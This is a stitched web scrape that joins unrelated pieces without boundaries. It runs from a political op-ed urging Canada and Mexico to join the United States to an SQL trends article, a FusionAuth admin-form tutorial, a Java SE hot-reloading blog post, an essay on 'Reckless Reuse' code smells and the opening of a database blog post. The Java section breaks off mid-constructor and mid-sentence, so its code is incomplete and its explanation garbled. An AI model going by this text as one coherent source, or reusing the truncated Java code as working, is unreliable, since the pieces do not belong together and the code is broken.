the current level of multiculturalism. In his wonderful optimism about America, Yglesias forgets the deep sclerosis that has beset the country. Practically speaking, immigration could yield a few tens of millions more Americans, not <em>One Billion Americans</em>. That is very much worth doing, but it is not enough.</p><p>We need a different proposal. We need a proposal that can rise to the magnitude of the challenge, achieving massive growth rapidly, while also being practically possible. We need Canada and Mexico to join the Union.</p><p>This is not some “globalist” project; this is not an attempt to erect some supranational “North American Union” like the EU. The goal would not be to have Canadians, Mexicans, and Americans somehow coexist in a supercharged version of NAFTA. Rather, it would be to make Canadians and Mexicans Americans—to make them part of the political community. It would be an affirmation of the nation; a reinvigoration of the age-old project of the United States; a fulfillment of the American destiny.</p><p>Accepting Canada and Mexico into the Union would inject the nation with new lifeblood: young men and women eager to work hard, entrepreneurial minds with …</p></div></section></article></div></div></div>

<p>SQL is one of the most in-demand technical skills in the workplace today. Developed back in the 1970s, it is still the way we interface most of our data systems today. Regardless of what drag and drop tools come around or what new query paradigms try to overtake it, it has remained.</p>
<p>Many modern database technologies we will talk about today in this article are constantly having to comply with SQL policies vs. SQL needs to be updated.</p>
<p>However, this isn’t to say the SQL landscape hasn’t changed a lot in the past few decades and doesn’t continue to evolve. This is one reason SQL has stuck around so much. It grows and evolves with the times.</p>
<p>This article will summarize some of the major trends currently occurring in the SQL and data analytics world that are impacting teams across the world.</p>
<p>We will be discussing how SQL is becoming more collaborative and open. How the majority of databases our world continues to operate on are open source or switching to open source. As well as bringing up a few technologies you may not have heard of but should watch out for.</p>
<p>With so much going on in the technical world, this will help provide a clear picture of some of the more important changes in the SQL and data world.</p>
<h3><a href="https://dev.to/seattledataguy/what-is-trending-in-the-big-data-and-sql-world-in-2020-5c0n#sql-is-not-just-for-data-engineers-and-analysts-in-datadriven-companies" name="sql-is-not-just-for-data-engineers-and-analysts-in-datadriven-companies"></a>SQL Is Not Just For Data Engineers And Analysts In Data-Driven Companies</h3>
<p>If you have ever worked at a FAANG or even technology-driven start-up like Instacart, then you have probably realized that data drives everything.</p>
<p>To the point that&nbsp;<a href="https://www.dataquest.io/blog/data-analyst-skills/">analysts</a>, PMs, and&nbsp;<a href="https://www.departmentofproduct.com/blog/sql-skills-for-product-managers/">product managers</a>&nbsp;are starting to understand SQL out of necessity. SQL is the language of data and if you want to interact with data, you need to know it.</p>
<p>Do you want to easily figure out the average amount of time a user spends on your product, but don’t want to wait for an analyst? You better figure out how to run a query.</p>
<p>This ability to run queries easily is also driven by the fact that SQL editors no longer need to be installed. With cloud-based data, warehouses come SaaS SQL editors. We will talk about a SaaS SQL editor more in the next section.</p>
<p>However, the importance here is you don’t have to wait 30 minutes to install and editor and deal with all the hassle of managing it.</p>
<p>Now you can just go to a URL and access your team’s data warehouse. This has allowed anyone in the company easy access to their data.</p>
<p>We know both from anecdotal experience as well as the fact that indeed.com’s tracking in 2019 has shown a steady requirement for SQL skill sets for the past 5 years.</p>
<p>Overall, we foresee a future where not just big tech companies are using SQL and analytics to drive good decisions. For that, we will need tools that make it easier for anyone to access their companies data.</p>
<h2><a href="https://dev.to/seattledataguy/what-is-trending-in-the-big-data-and-sql-world-in-2020-5c0n#sql-and-analytics-are-becoming-more-collaborative%C2%A0" name="sql-and-analytics-are-becoming-more-collaborative%C2%A0"></a>SQL and Analytics Are Becoming More Collaborative</h2>
<p><a href="https://i0.wp.com/res.cloudinary.com/practicaldev/image/fetch/s--TsiJN7mv--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/i/bie8pm39rvfcno20u7a8.png?ssl=1"><img src="https://i0.wp.com/res.cloudinary.com/practicaldev/image/fetch/s--TsiJN7mv--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/i/bie8pm39rvfcno20u7a8.png?w=3840&amp;ssl=1" alt="Alt Text" data-recalc-dims="1"></a></p>
<p>SQL and analytics are becoming more collaborative. As discussed earlier, getting insights from data is becoming more prolific. That means more people are getting involved in creating queries, analytics, and metrics.</p>
<p>Collaborative work started with products like Google Sheets. The trend has continued to expand into SaaS products like Figma which is collaborative design and&nbsp;<a href="https://popsql.com/?utm_source=seattledataguy">PopSQL</a>&nbsp;which is collaborative SQL.</p>
<p>Technologies like PopSQL offer the ability for your team to collaborate and track your work on queries easily through folders and version control.</p>
<p>Now you don’t have to worry about someone accidentally changing your query on a report or dashboard. Version control, allows you to revert what the query was at a previously saved state. This ensures that your team is constantly on the same page as far as SQL and the logic you are using to calculate your metrics.</p>
<p>You also can easily share queries, update them, fork them, and visualize data.</p>
<p>Also, tools like Figma, Google Sheets, and PopSQL integrate easily with other collaborative tools like Slack. These integrations further allow your team to share charts, queries, designs, and insights with ease.</p>
<p>Your team can easily see what work everyone else is doing, the changes they are making, and understanding why they are making the changes.</p>
<p>With the concept of remote work becoming more and more of a reality for many companies, having tools that make it easy to collaborate will be important.</p>
<p>In the end, technologies like PopSQL are a great step in the direction of self-service analytics because they put the power of querying data outside of just the analysts and the data engineers’ hands.</p>

<p>Paid licensed database management systems like Oracle and MSSQL might seem like very popular options for teams to develop upon. However, MySQL and Postgres, two open-source database management systems are currently the most popular options for developers to use.</p>
<p>According to a survey conducted in&nbsp;<a href="https://www.eversql.com/most-popular-databases-in-2018-according-to-stackoverflow-survey/">2018</a>&nbsp;and&nbsp;<a href="https://www.eversql.com/most-popular-databases-in-2020/">2020</a>&nbsp;by EverSQL, MySQL continues to be the most popular database management system to develop on. Also, Postgres has recently surpassed MSSQL as the second most popular database according to Stackoverflow.</p>
<p>Postgres is what is called the object-relational database management system or (ORDBMS). This takes on similar properties as object-oriented programming where you can have classes and inheritance. Also, some other nifty features about Postgres are that it allows for arrays and has some PubSub abilities.</p>
<p>This shift to open source isn’t new. However, the&nbsp;<a href="https://aws.amazon.com/blogs/aws/migration-complete-amazons-consumer-business-just-turned-off-its-final-oracle-database/">fact is that many companies are starting to drop the Oracles and Microsofts&nbsp;</a>for the free option. They are opting into paying cloud costs vs. paying licensing cost.</p>
<p>Overall, we are seeing a lot of shifts in the choice of database developers are picking.</p>

<p>Although Postgres has often been a common choice for companies choosing to switch from Oracle to an Open Source solution, Postgres was not developed with Cloud infrastructure and complexities in mind.</p>
<p>This forces teams to develop complex cloud infrastructure to manage applications that are being used all across the world.</p>
<p>But, there are other open-source solutions.&nbsp;<a href="https://thenewstack.io/yugabyte-new-database-solve-sql-vs-nosql-dilemma/">In July 2019 YugabyteDB went 100% open source</a>. Now many of you are probably asking(especially if you are in the US), what is YugabyteDB?</p>
<p>YugaByte’s proprietary document-oriented storage format — a heavily customized form of&nbsp;<a href="http://rocksdb.org/">RocksDB</a>, which provides for low-latency access and a high density of data. It runs on popular and known APIs.</p>
<p>YugaByte aim’s to fill in all the gaps. You want a NoSQL database that also is ACID, then Yugabyte is looking to take over that market.</p>
<p>It is looking to solve the problems that developers have when deploying SQL databases like MySQL that require sharding and complex infrastructure to run multi-region systems.</p>
<p>YugaByteDB does so by auto-sharding and loading balancing as well as several other features that take advantage of the cloud’s first approach.</p>
<p>So why is YugaByte in this update if it has been around since 2016?</p>
<p>This is because Wipro ventures invested 30 million in Yugabyte earlier this month. Also, Wipro plans to take Yugabyte’s open-source SQL database to its clients. There are 1000 new possible companies that could be using Yugabyte.</p>
<p>Although Yugabyte is not on EverSQL’s survey results. In a couple of years, with more traction and users it may be. Now, truth be told, a database that solves all the problems of both NoSQL and standard relational databases would be a miracle. So in many ways, we are surprised there isn’t larger adoption.</p>
<p>We will be curious to see if in the next few years Yugabyte is like many of the other miracle technologies promised to solve all of your organization’s problems or if it will disappear like so many others.</p>

<p>In the tech world, there are two main uses of databases: applications, and analytics.</p>
<p>These two major use cases benefit from different database systems as well as different database designs.</p>
<p>In particular, analytical databases that run millions of calculations for thousands of analysts, data scientists, and data engineers at a single company often benefit from having some form of distributed or parallel component. Think Redshift and how it relies on MPP(massively parallel processing).</p>
<p>But there are a lot of new SQL and NoSQL technologies coming into this space.</p>
<p>For example, Starburst, a fork of Facebook’s Presto, received an<a href="https://www.crn.com/news/applications-os/starburst-collects-42m-in-funding-as-big-data-startup-ramps-up-product-development-channel-expansion">&nbsp;additional $42 million of funding.</a>&nbsp;Starburst is a spin-off of a Facebook open-source project(Presto). Starburst’s goal is to create an enterprise version of Presto since Presto in itself does not have access management, connectors to enterprise systems like Teradata, Snowflake, and DB2, or a management console where users can configure the cluster to auto-scale, for example.</p>
<p>This makes utilizing Presto on its own difficult if not impossible for most companies. This is a shame because Presto allows you to easily run queries across databases without loading the data into a data warehouse.</p>
<p>So the recent funding in Starbursts is great to see. We look forward to seeing where this technology will go and hope that more companies can take advantage of Presto without all the hassle of having to manage all of presto’s complexities.</p>
<p>While we are talking about distributed database systems like Presto, another interesting development this month&nbsp;<a href="http://spark.apache.org/releases/spark-release-3-0-0.html">was the release of Spark 3.0</a>. With this new version of Spark comes many enhancements. Many of these enhancements have been geared to allow Spark SQL to become more ANSI SQL compliant.</p>
<p>This is an important note. One pattern that seems to remain true is that you can’t get rid of SQL as is. Many tools and technologies have tried to develop their query languages. However, at the end of the day, SQL remains. Unlike many programming languages that have died out.</p>
<p>SQL remains the language of data.</p>

December 1, 2020 | https://fusionauth.io/blog/2020/12/01/manage-custom-user-profile-data/ | <a href="https://web.archive.org/web/*/https://fusionauth.io/blog/2020/12/01/manage-custom-user-profile-data/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            
              <p>Letting a user register and provide custom profile data solves the problem of bringing such data into your auth system. But how can you manage the data as it changes over time?</p>

<p>After people register, you will want to enrich or change their profile. Sometimes this happens via automated systems. In that case, you can use an API. But what if you want to allow employees or other humans to update a user profile data?</p>

<!--more-->

<p>Let’s set the stage. Suppose you created a custom registration form for a real estate search application, as outlined in <a href="https://fusionauth.io/blog/2020/08/27/advanced-registration-form/">this blog post series</a>. But you now want to update user profiles as they move through the home buying process.</p>

<p>As of <a href="https://fusionauth.io/blog/2020/10/27/announcing-fusionauth-1-20/">FusionAuth version 1.20</a>, you can now manage such data from within the administrative user interface. In this post, we’ll walk through how to set this up and why you might want to.</p>

<h2 id="prerequisites">Prerequisites</h2>

<p>This post assumes you’ve installed FusionAuth and created a custom registration form, as outlined in the above blog posts. If blog posts aren’t your jam, you can also read the <a href="https://fusionauth.io/docs/v1/tech/guides/advanced-registration-forms/">Advanced Registration Form guide</a> to learn how to set up your form.</p>

<p><em>Please note that advanced registration forms are a paid edition feature. You can <a href="https://fusionauth.io/pricing/">learn more about paid editions and sign up for a free trial here</a>.</em></p>

<h2 id="why-use-custom-admin-forms">Why use custom admin forms?</h2>

<p>Using custom admin forms lets users with access to the FusionAuth web interface manage custom user and registration data. This functionality is available out of the box. Previous to this release, you had to build your own app for editing profile information. Having this functionality in the FusionAuth admin screen means never having to use the APIs (unless you want to).</p>

<p>But perhaps you don’t want to expose all of the FusionAuth web UI and settings to the employees who only need to be able to update user profile data?</p>

<p>FusionAuth roles to the rescue! The FusionAuth application has over 25 roles that offer fine grained control. Whether you want to let people only manage themes  or webhooks, consents or lambdas, roles let you lock down access.</p>

<p>Let’s set up an account for managing users.</p>

<p>First, sign in as an admin, then create or edit a user.</p>

<p>Go to the “Registrations” tab and add or edit the user’s FusionAuth registration. Select the <code>user_manager</code> role. This role restricts the actions that this user can take. (Your own applications can have unlimited roles as well, which you can apply to your users in the same way.)</p>

<p>In this screenshot, the user being edited is assigned the <code>user_manager</code> role:</p>

<p><img src="https://fusionauth.io/assets/img/blogs/custom-admin-registration-form/adding-user-manager-role-to-user.png" alt="Setting the user_manager role for a user."></p>

<p>Save the user. If you view the user’s details, you can see that they have been assigned the <code>user_manager</code> role in the FusionAuth application:</p>

<p><img src="https://fusionauth.io/assets/img/blogs/custom-admin-registration-form/user-with-user-manager-role.png" alt="A user with the user_manager role."></p>

<p>You’ll log in as that user later on, but for now, let’s create the form for editing the user’s registration and profile data.</p>

<h2 id="create-the-custom-fields">Create the custom fields</h2>

<p>But first, let’s add one new field. The new field will record user status in the home buying process. Since this is a real estate application and you get paid when a user closes, you want to keep track of this small detail.</p>

<p>You’ll add a status field with the following values:</p>

<ul>
  <li>Looking</li>
  <li>Assigned to a realtor</li>
  <li>Under contract</li>
  <li>Closed</li>
  <li>Other</li>
</ul>

<p>This field isn’t useful when a user first registers for your search application, other than perhaps to default to “Looking”. Instead, employees will manage it in the admin screen as the user interacts with your company and your application.</p>

<p>Let’s add this custom field. Navigate to “Customizations”, then “Form Fields”. Add a new field:</p>

<p><img src="https://fusionauth.io/assets/img/blogs/custom-admin-registration-form/adding-user-status-field.png" alt="Adding the user status field."></p>

<p>Don’t make this form field required, though. Doing so would require a user to select a value at the moment they register.</p>

<h2 id="adding-the-form">Adding the form</h2>

<p>Next, you need to add a registration form. This will include any registration fields that should be editable by administrative users. In this case, you’ll add the existing custom fields from the registration form:</p>

<ul>
  <li>Minimum price</li>
  <li>Maximum price</li>
  <li>Geographic area</li>
</ul>

<p>As well as the field added above.</p>

<p>Navigate to “Customizations”, then “Forms”. Add a new form. Give it an intelligent name, and a type of “Admin Registration”. This means that this form is used to edit FusionAuth registrations. Remember, a registration is a mapping between a user and an application.</p>

<p>Now let’s add the form fields. You could create multiple sections in this form, but for only four fields it hardly seems worth it.</p>

<p>At the end, the new form should look like this:</p>

<p><img src="https://fusionauth.io/assets/img/blogs/custom-admin-registration-form/admin-registration-form.png" alt="Setting up the admin registration editing form."></p>

<p>Make sure you save it! Next up, you’ll associate the form with the previously created real estate FusionAuth application.</p>

<h2 id="tying-a-form-to-an-application">Tying a form to an application</h2>

<p>Now that the form is ready to go, you need to configure the application to use it.</p>

<p>Navigate to “Applications” and then edit your application. Go to the “Registration” tab and the “Form Settings” section. Change the “Form” value to the form added above:</p>

<p><img src="https://fusionauth.io/assets/img/blogs/custom-admin-registration-form/associating-form-with-application.png" alt="Configuring an application to use the admin registration editing form."></p>

<p>Save the application. Simple, eh? This form will now be used any time you or any other admin user adds or edits a registration for this FusionAuth application.</p>

<p>Forms can be reused across applications and even across tenants. Since FusionAuth supports multi-tenant configurations, if that’s what you need, you can build these forms once and reuse them many times. You can also manage the creation and updating of these forms and form fields via the API or client libraries, should you need to be able to modify them programmatically.</p>

<p>Next, you’ll use the form to edit a previously registered user. Let’s pretend they just bought a home with your company, so you can change their status to “Closed”. Cha-ching, you just made some imaginary money.</p>

<h2 id="editing-a-users-registration-data">Editing a user’s registration data</h2>

<p>For this section, you’ll use the user manager account you set up above. Sign out of your admin account, or open an incognito browser window. Visit the FusionAuth login screen.</p>

<p>Sign in with the user manager account previously created. See, I told you we’d come back to it.</p>

<p>Edit a user who has registered for the real estate search application and you can change their real estate preference data as well as their <code>userstatus</code>:</p>

<p><img src="https://fusionauth.io/assets/img/blogs/custom-admin-registration-form/edit-user-registration.png" alt="Editing a user's registration."></p>

<p>This account doesn’t have access to any FusionAuth functionality beyond user management. If a user hacks the URL, they’ll see this screen, stating clearly they are unauthorized for the functionality they are trying to access:</p>

<p><img src="https://fusionauth.io/assets/img/blogs/custom-admin-registration-form/dinesh-hacking-urls.png" alt="Trying to access forbidden FusionAuth URLs."></p>

<h2 id="go-further">Go further</h2>

<p>If you were paying attention, you might have thought I was pulling a fast one. You will have noticed that the title of the newly added field is <code>registration.data.userstatus</code> in the form.</p>

<p>This is suboptimal but it is happening because the field name hasn’t been added to the messages, which is where all the text UI elements are retrieved from. You can update that by editing the messages properties. This is covered in more detail in <a href="https://fusionauth.io/blog/2020/09/01/theme-registration-form/">this blog post</a>, which updated the properties file for other custom fields.</p>

<p>If you need to take action when a user’s registration data is changed, you could <a href="https://fusionauth.io/docs/v1/tech/events-webhooks/">use a webhook</a> to listen for that particular event. For example, you could automatically send flowers to the home buyer whenever their status is changed to “Closed”. This would require knowing the new home’s address as well as an integration with an online flower seller, but is left as an exercise for the reader.</p>

<h2 id="in-conclusion">In conclusion</h2>

<p>This new form functionality lets you build flexible user management interfaces without writing any code. The power and customizability of different form controls, validation rules, and multiple sections are all available to you. And while this post built a custom form for managing registrations, you can also build them for the editing custom user data as well.</p>

<p>Happy coding!</p>

</ul>

<hr>

<p>The <a href="https://docs.oracle.com/javase/specs/jls/se15/html/index.html">Java Language Specification</a> specifies in minute
detail the grammar and semantics of the Java Programming Language. It also includes platform features
like the <a href="https://docs.oracle.com/javase/specs/jls/se15/html/jls-12.html#jls-12.2">loading of classes and interfaces</a>,
<a href="https://docs.oracle.com/javase/specs/jls/se15/html/jls-7.html#jls-7.7.4">service provisioning</a> and <a href="https://docs.oracle.com/javase/specs/jls/se15/html/jls-9.html#jls-9.7">annotations</a>
that can provide runtime and compile-time information for meta-programming.</p>

<p>With all these features, I think it’s fair to consider <a href="https://www.oracle.com/java/technologies/java-se-glance.html">Java Standard Edition</a>,
or Java SE, as a framework in its own right.</p>

<p>It is not to be confused with <a href="https://www.oracle.com/java/technologies/javaee-8-sdk-downloads.html">Java EE</a>, or
Java Enterprise Edition <a href="#footnote-1">[1]</a> (recently rebranded as <a href="https://jakarta.ee/">Jakarta EE</a>), which adds <a href="https://jakarta.ee/specifications/">loads and loads of APIs</a>
against which Java programmers can create huge enterprisey things on top of
<a href="https://jakarta.ee/specifications/pages/3.0/jakarta-server-pages-spec-3.0.html">JSPs</a> and <a href="https://jakarta.ee/specifications/servlet/5.0/jakarta-servlet-spec-5.0.html">Servlets</a>,
for example.</p>

<p>Java EE was all the rage in the early 2000’s, but these days
you’re more likely to find Java software based on things like <a href="https://spring.io/">Spring</a> and its more
streamlined version <a href="https://spring.io/projects/spring-boot">Spring Boot</a>, or even trendier things like
<a href="https://micronaut.io/">Micronaut</a> and <a href="https://quarkus.io/">RedHat’s Quarkus</a> (I know it must be very cool because its slogan is
<em>SUPERSONIC SUBATOMIC JAVA</em>), both of which promise to make Java more Kubernetes/Cloud/Microservice friendly <a href="#footnote-2">[2]</a>.</p>

<p>What you’re very unlikely to see is Vanilla Java being used in the real world.</p>

<p>By Vanilla Java, I mean just Java SE, without any frameworks, making use of only small libraries, where it makes sense.</p>

<blockquote>
<p>The term “Vanilla Java”, as I am using here, was inspired by our JS friends who coined <a href="http://vanilla-js.com/">Vanilla JS</a>
for the “framework” included in every browser since the 1990’s.</p>
</blockquote>

<p>As most people who have had to create complex applications on top of multiple frameworks can attest, frameworks do not
bring only upsides. They bring a lot of downsides too.</p>

<p>If you’re unlucky enough to need something fundamental that is not supported by the framework (or even that is just not
easily found in the documentation), you may need to employ horrible hacks to get things done. Over the years, the number of
hacks might grow so much that you might realize you’ve implemented a second framework on top of your framework to work
around its (perceived or real) limitations.</p>

<p>This is the number one cause of <a href="https://en.wikipedia.org/wiki/Big_ball_of_mud">big balls of mud</a> appearing in long-lived,
not-so-loved code bases, in my opinion.</p>

<p>What if I told you that you can write applications in Java using just the tools the SE platform provides?
What if in doing so, you did not significantly increase the amount of boilerplate code you have to write by a
significant margin when compared with the size of the application you have to write?</p>
<div>
<figure>
    <img src="https://renato.athaydes.com/images/java-se-framework/electric-light-bulb_1f4a1.png" alt="Light bulb moment">
    </figure>
</div>
<p>Suddenly, there’s nothing to be worked around. Everything you need, you can go and write or change yourself using the
language you know, with the help of whatever library you need (and Java has a library for everything). Searching for
information on your “platform” is a breeze.</p>

<p>In this blog post, I want to show you features of Java SE that you may not have realized are available to you as well,
not only to framework authors.</p>

<p>I will show you how you can create an application that <strong>hot-reloads when you re-compile it</strong> (because yes, that has
been a feature of Java all along, not of any particular framework, though they would like you to think so).
Then, I’ll show how you can create your own annotations and use them to magically generate code to do what you want,
so you can still avoid having to write tedious code that sinks productivity.
Finally, I will show how you can write and run tests without any framework, using JUnit as a library and CLI.</p>

<p>We will do all this while using <strong>no build system</strong> at all, just a few helper libraries, because after all, we are not
savages: we do want to benefit from the free work of others to get our shit done quickly.</p>

<blockquote>
<p>Each section of this blog post will have a link to the relevant branch of the <a href="https://github.com/renatoathaydes/raw-jse">raw-jse</a>
repository I’ve created to accompany it. The links look like the one shown below, with a checkered flag representing
each <em>checkpoint</em> we’ve accomplished.</p>
</blockquote>



<p>Let’s get started.</p>



<h2>Hot Reloading a Java SE App</h2>

<p>🔄</p>

<p>The first thing we need to stay productive while writing a new application is hot-reloading.</p>

<p>If you haven’t had hot-reloading before, you might think this is a minor improvement over whatever your current situation
is and as such it’s not a must-have. You would be mistaken.</p>

<p>It’s huge to be able to re-compile your application and immediately see the results in front
of you. It’s better than a REPL because it’s your actual code running, not just some snippet you’re playing around with!</p>

<p>To get hot reloading in Java is not hard. You just need to split up your application into a kind of loader application
which never changes, and a dynamic part which you can hot swap at will.</p>

<p>To the best of my knowledge, there’s no way to hot swap ALL of your code unless you attach a debugger to it
(which allows only very limited hot swapping) or use black magic related to <a href="https://www.baeldung.com/java-management-extensions">JMX</a>
(which I think is what JRebel used to do).</p>

<blockquote>
<p>I wrote a blog post years ago about <a href="https://sites.google.com/a/athaydes.com/renato-athaydes/posts/4freewaystohot-swapcodeonthejvm">4 different ways to hot-reload code</a>
on the JVM. The method I will show here is fundamentally different, though, as it will work without a debugger,
without enabling JMX and is almost certain to work with any Java version, even with Java 16-EA, because we’re only
using the SE platform, nothing else.</p>
</blockquote>

<p>To demonstrate hot reloading, I’ll create a simple application class that implements <code>Runnable</code>. Every time we
re-compile the application, it will re-run the application class (this re-compilation itself can also be automated
easily via a small bash script or your IDE).</p>

<p>In a real app, this would be something like a HTTP request handler, or <code>Controller</code> as people like to call it,
but to start with, this example should do.</p>

<p>Here’s our super complex first implementation:</p>
<pre><span>public</span> <span>final</span> <span>class</span> <span>Starter</span> <span>implements</span> Runnable <span>{</span>
    @Override
    <span>public</span> <span>void</span> <span>run</span><span>(</span><span>)</span> <span>{</span>
        System<span>.</span><span>out</span><span>.</span><span>println</span><span>(</span> <span>"Starter running!"</span> <span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</pre>
<p>If we just ran this from <code>main</code>, we couldn’t re-compile it and expect the JVM to let us re-define the class later.
Even if we could do that, we would eventually run into trouble when we kept state somewhere (think of a cache for
example) and then re-defined the classes that state depended upon.</p>

<p>We need to, as I said in the introduction, split up our application classes that we want to be able to reload from
the application engine, which will be static.</p>

<p>Let’s call our application engine <code>framework</code> because that’s what it is replacing for us. You may think that writing
our own framework is no better than using an existing framework, but the point is that this is not a generic framework,
it’s a framework we’re writing to do exactly what our particular application needs to do. As you’ll see, it’s going to
stay simple because it has a hugely simpler job than a generic framework that needs to be able to do everything, a
patently impossible goal that we’re staying well clear of.</p>

<p>We should keep the <em>framework</em> classes and the <em>app</em> classes in separate compilation units (or modules).</p>

<p>The framework will need two things, a <code>Main</code> class to bootstrap the app and hot reload it, and a <code>WatchDir</code> class
to monitor the app compilation directory for changes, so it can automatically reload the classes when they change.</p>

<p>The final result should look something like this in your file system:</p>
<pre>.
├── app
│   ├── app.iml
│   └── src
│       └── Starter.java
├── framework
│ ├── framework.iml
│ └── src
│     ├── Main.java
│     └── WatchDir.java
└── raw-jse.iml
</pre>
<p>The <code>.iml</code> files are created by IntelliJ because even though I dislike heavy frameworks, I like IDEs very much.</p>

<p>If you’re curious how to create the above structure in IntelliJ, just create a simple Java project without build tools or
libraries, then do <code>File &gt; New &gt; Module...</code> for <code>app</code> and <code>framework</code>, then create the Java classes.</p>

<p>The <code>WatchDir</code> class uses Java’s <code>FileWatcher</code> as shown in the <a href="https://docs.oracle.com/javase/tutorial/essential/io/examples/WatchDir.java">Oracle Tutorial</a>,
which I basically copied, then simplified to call a lambda a couple of seconds after changes were detected, but only if no
more changes occurred in the previous couple of seconds (so the compiler can keep writing class files and we’ll only load
them once the compiler stops doing work).</p>

<p>This is what <code>Main.java</code>’s <code>main</code> function looks like:</p>
<pre><span>final</span> <span>class</span> <span>Main</span> <span>{</span>
    <span>final</span> AtomicReference<span>&lt;</span>AppRuntime<span>&gt;</span> appRef <span>=</span> <span>new</span> AtomicReference<span>&lt;</span><span>&gt;</span><span>(</span><span>)</span><span>;</span>
    <span>final</span> File classPathDir<span>;</span>
    <span>final</span> String appClassName<span>;</span>

    <span>public</span> <span>Main</span><span>(</span> File classPathDir<span>,</span> String appClassName <span>)</span> <span>throws</span> IOException <span>{</span>
        <span>this</span><span>.</span><span>classPathDir</span> <span>=</span> classPathDir<span>;</span>

<p>As you can see, we take the classpath of the app and its <code>Runnable</code> class as arguments, create a <code>WathDir</code> instance

<p>We keep an <code>AtomicReference&lt;AppRuntime&gt;</code> so we always know which app is currently loaded.</p>

<p><code>AppRuntime</code> is a simple data class:</p>

                    <p>Does your project have an enormous module called <em>something-manager</em> or <em>something-controller</em> that grew beyond any possible limits and became completely unmaintainable? How many do you have?</p><p>Usually, <a href="https://en.wikipedia.org/wiki/Code_smell">code smells</a> are the results of deliberate actions:</p><blockquote>We had a tight deadline and agreed to ship overcomplicated and unreadable code. We never prioritized writing tests, and now we little confidence in changing old logic.</blockquote><p>Large modules are a different story. They do not happen overnight, and I'm yet to see a person suggesting to put a ton of random methods to one pile and call this pile <em>GlobalManager </em>or <em>Utils</em>. It is never a choice, but rather the result of many good intentions: small enough to attract attention, but still dangerous to cause harm.</p><h2 id="evolution-of-one-module">Evolution of one module</h2><p>Let me start from an oversimplified fictional example.<br>Imagine that you work on a piece of software for college students and their teachers.<br>First of all, we need to allow teachers to see all assignments that a particular student has. Let's write a module for it!</p><p>This is what we need to do:</p><ul><li>Check that a user is a teacher and hence has necessary permissions</li><li>Get all we need from the database</li><li>Format the result and show it to the user</li></ul><figure><img src="https://evgenii.info/content/images/2020/11/image-5.png" alt=""><figcaption>One public <code>showAssignments</code> and some private functions</figcaption></figure><p>A work in progress, but nothing terrible is happening so far.</p><p>Time goes, and teachers request another feature: they also want to see which <em>books</em> their students have. Sounds like a weird request, but we can live with that.</p><p>For this feature, we can reuse several functions we wrote before (<em>getRole, formatResult</em> and <em>showContent</em>). All we need to do is to add this small change:</p><figure><img src="https://evgenii.info/content/images/2020/11/image-6.png" alt=""><figcaption>A small change</figcaption></figure><p>At some point later, we get another request, but it is not about teachers anymore — students also want to keep track of their books to know what they need to return to the library.<br>This one is even easier to implement:</p><figure><img src="https://evgenii.info/content/images/2020/11/image-7.png" alt=""><figcaption>Another small change</figcaption></figure><p>tiny function that reuses previously implemented capabilities — easy choice, easy code review.<br>But now students have one more request: they need more information about their books, i.e. the date when it should be returned. Something that <em>formatResult </em>cannot do. Luckily, we are programmers and can make them happy:</p><figure><img src="https://evgenii.info/content/images/2020/11/image-8.png" alt=""><figcaption>Splitting <em>formatResult</em> and <em>formatBooksForStudents</em></figcaption></figure><p>Job is done!<br>The last piece of news for this example: teachers decided that the strange case about seeing students' books was redundant, and there is no real situation for which it would be needed.<br>Who does not like removing code, huh?</p><figure><img src="https://evgenii.info/content/images/2020/11/image-9.png" alt=""><figcaption>Another simple change</figcaption></figure><h2 id="boiling-frogs">Boiling frogs</h2><p>We must be proud because we maximized code reuse and iteratively supported new use cases with minimal code changes. All commits were concise and sensible, at least at first glance.</p><p>However, it is worth checking the module once again — not only the changes but full content:</p><figure><img src="https://evgenii.info/content/images/2020/11/image-10.png" alt=""><figcaption>Two unrelated use-cases in one file</figcaption></figure><p>Two different types of content for two different types of users. Not much overlap.</p><p>What's much worse is that this module is prone to unlimited expansion. Every small change related to students, teachers, books or assignments is justifiable until at some time we wake up with a module so big that the only thing left to do is teach it how to make coffee. Fortunately, <a href="https://en.wikipedia.org/wiki/Boiling_frog">the water is already boiling</a>.</p><h2 id="why-it-happens">Why it happens</h2><p>Several factors are contributing to this process.</p><p>We, developers, love reusing code. It saves us a lot of effort — can you imagine the world where we had to write everything from scratch?</p><p>At the same time, we do not like changing old code. Sometimes it is hard, sometimes it is unsafe, sometimes it just makes us think.</p><blockquote>Code that we can reuse — investment.<br>Code that we have to change — legacy.</blockquote><p>That leads to the thinking pattern which I call <em>Reckless Reuse</em>:</p><figure><img src="https://evgenii.info/content/images/2020/11/image-11.png" alt=""><figcaption>Reckless Reuse</figcaption></figure><h2 id="how-to-avoid">How to avoid</h2><p>To prevent <em>Reckless Reuse</em>, keep in mind the original purpose of a module you intend to change:</p><figure><img src="https://evgenii.info/content/images/2020/11/image-12.png" alt=""><figcaption>Refactor before reuse</figcaption></figure><p>In our example, we could move the functions <em>getRole</em> and <em>showContent</em> outside of the module that serves teachers, so we still can reuse them from other places of the application without having to grow the teachers' module.</p><p>Unfortunately, it is never enough to just do it yourself – all collaborators should adopt the same practices. There are a couple of tricks that can help you with that:</p><ul><li>Invest in proper naming. <br>Make sure the names of your files reflect their purposes. If naming is hard, it may mean that you try to call something that should never exist.</li><li>Write comments about the goals of your modules. <br>If the name alone is not explanatory, consider adding a paragraph or two about which set of problems a given module is supposed to solve.</li></ul><p>It should help you to notice when modules start doing something beyond their initial scope. Even when a change is small and reasonable, it will raise questions when somebody adds the method <em>trackAttendance</em> into the module <em>book-data-provider.</em></p><hr><p>As always, you can <a href="https://evgenii.info/reckless-reuse#subscribe">subscribe to Resilient Systems</a> and receive new articles by email if you haven't done it yet. <br>You also can <a href="https://twitter.com/_elergy_">find me on Twitter</a> or somewhere else – I am always happy to chat :-) </p>

<p>I have to admit, my research blog posts are getting longer and longer. From one
side I find it genuinely encouraging, because if one gets so much information
just by scratching the topic, imagine what’s hidden beneath the surface! One
university professor once said “what could be interesting in databases?”, and
it turns out freaking a lot! On the other side it certainly poses problems for
potential readers. To overcome them I would suggest an interesting approach:
print this blog post out, or open it on your tablet/e-reader, where you can
make notes with a pencil or markers. Now while reading it try to spot ideas
particularly exciting for you and mark them. Along the way there would be
definitely some obscure parts or questions, write them on the sides as well.
You can experiment with the diagrams, changing or extending them, or just
drawing funny faces. But do not read everything at once, have no fear of
